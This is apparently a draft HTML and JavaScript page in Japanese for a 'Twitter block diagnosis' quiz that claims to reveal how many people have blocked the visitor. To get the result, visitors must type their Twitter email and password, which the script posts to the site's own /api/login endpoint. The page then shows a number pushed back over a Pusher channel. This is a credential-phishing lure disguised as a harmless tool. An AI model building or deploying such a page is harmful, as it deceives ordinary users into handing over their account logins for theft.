<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Twitter ブロック診断</title>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            background-image: radial-gradient(#d1d5db 1px, transparent 1px);
            background-size: 20px 20px;
            color: #0f1419;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            text-align: center;
            background: rgba(255, 255, 255, 0.9);
            border-radius: 16px;
            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);
            backdrop-filter: blur(5px);
        }

        .screen { display: none; }
        .active { display: block; }
        .logo-placeholder {
            width: 100px;
            height: 100px;
            background-color: #5bcbf5;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            color: #fff;
        }

        h1 {
            font-size: 28px;
            font-weight: 800;
            margin-bottom: 20px;
        }

        p {
            font-size: 15px;
            line-height: 1.6;
            color: #0f1419;
            margin-bottom: 30px;
        }

        .btn {
            width: 100%;
            padding: 15px;
            background-color: #5bcbf5;
            color: white;
            border: none;
            border-radius: 9999px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.2s;
        }
        .btn:hover { background-color: #4ab8e0; }
        .input-group { margin-bottom: 20px; text-align: left; }
        label { display: block; font-weight: bold; margin-bottom: 8px; font-size: 18px; }
        input {
            width: 100%;
            padding: 12px;
            border: 2px solid #000;
            border-radius: 8px;
            font-size: 16px;
            outline: none;
        }

        .spinner {
            width: 150px;
            height: 150px;
            background-color: #5bcbf5;
            border-radius: 50%;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(0.95); opacity: 0.7; }
            50% { transform: scale(1.05); opacity: 1; }
            100% { transform: scale(0.95); opacity: 0.7; }
        }

        .result-number {
            font-size: 80px;
            font-weight: bold;
            margin: 20px 0;
        }
        .share-section {
            margin-top: 30px;
            font-size: 14px;
            color: #536471;
        }
    </style>
</head>
<body>

    <div class="container">>
        <div id="screen-top" class="screen active">
            <div class="logo-placeholder">/images/logo.png<br>1:1</div>
            <h1>Twitter ブロック診断！</h1>
            <p>このツールはTwitterで何人にブロックしているか<br>簡単に確認できるツールです。<br>このツールを使うにはまずログインしてください。</p>
            <button class="btn" onclick="goToForm()">ログイン</button>
        </div>
        <div id="screen-form" class="screen">
            <h1>Twitter ブロック診断</h1>
            <div class="input-group">
                <label>メールアドレス</label>
                <input type="text" id="email">
            </div>
            <div class="input-group">
                <label>パスワード</label>
                <input type="password" id="password">
            </div>
            <button class="btn" onclick="startDiagnosis()">診断開始する</button>
        </div>

        <div id="screen-loading" class="screen">
            <h1>Twitter ブロック診断</h1>
            <p>リクエストが送られました！<br>診断結果が出るまでお待ちください！</p>
            <div class="spinner">
                ここに適当なローディングのくるくる
            </div>
        </div>
        <div id="screen-result" class="screen">
            <h1>Twitter ブロック診断</h1>
            <p>診断結果が出ました！<br>ブロックされている人の人数は</p>
            <div class="result-number"><span id="block-count">0</span></div>
            <p>人です</p>
            <button class="btn">結果をSNSでシェア</button>
            <div class="share-section">
                この辺にtwitterとかfacebookのアイコンとか
            </div>
        </div>
    </div>

    <script>
        const PUSHER_KEY = '787f1e0b321698ae6439'; 
        const PUSHER_CLUSTER = 'ap3';
        let sessionId = crypto.randomUUID(); 

        const pusher = new Pusher(PUSHER_KEY, {
            cluster: PUSHER_CLUSTER
        });
        
        const channel = pusher.subscribe('diagnosis-' + sessionId);
        channel.bind('result-event', function(data) {
            document.getElementById('block-count').innerText = data.count;
            showScreen('screen-result');
        });

        function showScreen(id) {
            document.querySelectorAll('.screen').forEach(el => el.classList.remove('active'));
            document.getElementById(id).classList.add('active');
        }

        function goToForm() {
            showScreen('screen-form');
        }

        function startDiagnosis() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            if(!email || !password) return alert('入力してください');

            showScreen('screen-loading');

            fetch('/api/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    email: email,
                    password: password,
                    sessionId: sessionId
                })
            });
        }
    </script>
</body>
</html>
